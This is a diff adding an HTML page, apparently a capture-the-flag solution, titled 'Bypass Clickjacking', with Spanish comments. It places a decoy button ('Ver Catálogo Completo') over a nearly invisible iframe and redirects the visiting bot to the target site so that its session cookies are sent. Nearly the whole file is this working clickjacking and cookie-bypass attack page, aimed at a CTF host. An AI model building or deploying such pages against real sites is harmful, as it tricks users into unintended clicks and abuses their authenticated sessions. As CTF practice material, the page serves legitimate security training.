@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bypass Clickjacking</title>
+    <style>
+        body { margin: 0; padding: 0; background: #f0f0f0; font-family: sans-serif; }
+        
+        /* El botón que el bot buscará */
+        #objetivo {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            width: 300px;
+            height: 100px;
+            z-index: 10;
+            background: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.0001; /* Cámbialo a 0.5 para ver si carga el login */
+            z-index: 5;
+        }
+    </style>
+</head>
+<body>
+
+    <button id="objetivo">Ver Catálogo Completo</button>
+
+    <script>
+        const btn = document.getElementById('objetivo');
+        
+        // Cuando el bot haga clic en #objetivo, abrimos la web en una ventana nueva
+        // o redirigimos la principal. Esto "despierta" las cookies.
+        btn.onclick = function() {
+            // Abrimos la página del libro. Al ser una navegación "Top-Level",
+            // las cookies SÍ se enviarán.
+            window.location.href = "https://ctf.fap.hispasec.com:8018/books/1";
+        };
+
+        // Si el bot vuelve atrás o si el sistema permite "Popups",
+        // podemos intentar cargar el iframe aquí.
+    </script>
+</body>
+</html>
